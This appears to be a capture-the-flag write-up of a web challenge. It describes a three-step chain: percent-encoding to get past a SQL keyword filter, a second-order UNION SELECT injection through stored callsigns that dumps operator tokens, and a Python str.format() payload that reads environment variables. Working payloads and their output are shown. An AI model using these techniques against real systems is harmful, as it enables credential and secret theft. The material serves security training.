# Operation Dawn: The Dispatch Console

**Author:** mar

**Web** · 271 pts

**TL;DR.** The console's SQL-keyword sanitiser inspects the raw request bytes while the form parser
decodes afterwards, so `%55NION%20%53ELECT` passes the filter and is stored as `UNION SELECT`.
Stored callsigns are then interpolated unparameterised into `/digest`'s per-callsign query — a
second-order injection that dumps the `operators` table and its command-net token. `/report` renders
a caller-supplied `fmt` with `str.format()`, and `{dispatch.__init__.__globals__[os].environ[FLAG]}`
reads the flag out of the process environment.

## Solve

**Bypass the sanitiser at the wire layer.** `POST /post` with `body=UNION SELECT x` → `403 request
rejected by console sanitiser`; the same body sent as `%55NION%20%53ELECT%20x` → `201 dispatch
filed`, and the stored row reads back as the literal `UNION SELECT x`. The filter matches the
percent-encoded wire text; the form parser decodes it afterwards.

**Second-order SQLi through stored callsigns.** `/digest` iterates the distinct callsigns and builds
a per-callsign query `... WHERE callsign = '<callsign>'` with no parameterisation. A stored callsign
of `Z' OR callsign='COMMAND` makes the digest print the COMMAND row's body. Comments are unreliable
on the wire (`/*` is blocked raw but `%2F*` passes), so the payloads avoid them and balance the
handler's own closing quote with `WHERE '1'='1`:

```
X' UNION SELECT callsign||'|'||token||'|'||role FROM operators WHERE '1'='1
```

Digest output:

| callsign | token | role |
| --- | --- | --- |
| CINDER | `OP-7f65cda0de4fac5ac843` | post |
| EMBER | `OP-8228d4f38d85016561ea` | post |
| WARDEN | `AC-3bb9f14dd7c9ff2b4c0e5586` | **command** |

**Format-string injection on `/report`.** The command token unlocks the renderer, and `fmt` is handed
to `str.format(dispatch=Dispatch(...))` — attribute access and indexing are live:

```
/report?token=AC-3bb9f14dd7c9ff2b4c0e5586
        &fmt={dispatch.__init__.__globals__[os].environ[FLAG]}
```

→ `<pre>CSCTF{HPS75X9dex4SzN3Fvowo1WFo}</pre>`

`{dispatch}` renders `<__main__.Dispatch object at 0x…>` and `{dispatch.__class__}` shows
`<class '__main__.Dispatch'>`, which is how the object was fingered as traversable. Calls are not
available — `os.popen('env')` parses as an attribute name and errors — but indexing `os.environ`
dumps the whole environment.

**Flag:** `CSCTF{HPS75X9dex4SzN3Fvowo1WFo}`

**Evidence.** The chain, operator dump and control matrix come from the live-solve workspace
`ctf-ashdispatch/WRITEUP.md` and its runner [solve_ashdispatch.py](solve_ashdispatch.py); the
rendered `/report` response containing the flag is saved as [files/rep4.html](files/rep4.html), and
the flag is also listed in `ctf-helio/REPORT-FULL.md` (§13). CTFd recorded the solve at
2026-11-06T17:02:37Z. The original instance (`:33893`) died mid-engagement and a replacement
(`:33927`) carried the same seed data; the saved pages are from the replacement.
